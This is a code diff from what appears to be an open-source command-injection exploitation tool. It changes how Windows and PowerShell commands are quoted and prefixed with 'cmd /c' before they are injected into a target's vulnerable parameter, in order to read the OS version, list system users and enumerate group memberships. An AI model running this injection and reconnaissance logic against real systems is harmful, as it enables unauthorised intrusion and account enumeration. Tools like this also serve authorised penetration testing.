@@ -36,8 +36,6 @@ def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_
   cmd = settings.PS_VERSION
   if alter_shell:
     cmd = cmd.replace("'","\\'")
-  else:
-    cmd = "\"" + cmd + "\""
   #Command execution results.
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   # Evaluate injection results.
@@ -105,8 +103,9 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
   if settings.TARGET_OS == "win":
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
   cmd = settings.RECOGNISE_OS 
-  if alter_shell:
-    cmd = "cmd /c " + cmd 
+  if settings.TARGET_OS == "win":
+    if alter_shell:
+      cmd = "cmd /c " + cmd 
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
@@ -220,9 +219,11 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
     settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
     if alter_shell:
       settings.SYS_USERS = settings.SYS_USERS.replace("'","\\'")
-    else:  
-      settings.SYS_USERS = "\"" + settings.SYS_USERS + "\""   
-  cmd = settings.SYS_USERS       
+    # else:  
+    #   settings.SYS_USERS = "\"" + settings.SYS_USERS + "\""   
+  cmd = settings.SYS_USERS    
+  if settings.TARGET_OS == "win":
+    cmd = "cmd /c " + cmd 
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
@@ -263,8 +264,7 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
             if alter_shell:
               cmd = cmd.replace("'","\\'")
-            else:
-              cmd = "\"" + cmd + "\""
+            cmd = "cmd /c " + cmd 
             response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
             check_privs = cb_injector.injection_results(response, TAG, cmd)
             check_privs = "".join(str(p) for p in check_privs).strip()
